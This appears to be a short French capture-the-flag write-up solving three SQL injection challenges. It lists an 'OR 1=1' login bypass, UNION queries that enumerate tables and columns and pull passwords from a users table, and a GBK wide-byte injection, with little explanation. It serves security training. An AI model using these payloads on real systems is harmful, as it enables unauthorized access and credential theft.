1/3

On tente un payload assez classique : 'OR 1=1#

2/3

Le payload de la première partie ne fonctionne plus, il nous faut donc trouver la table:
'UNION SELECT table_name,null,null,null FROM information_schema.tables -- -
'UNION SELECT column_name,null,null,null FROM information_schema.columns WHERE table_name="users" -- -
'UNION SELECT password,null,null,null FROM users -- -

3/3

Il s'agit d'une faille sql assez rare en CTF, une GBK :
1¿' OR TRUE#
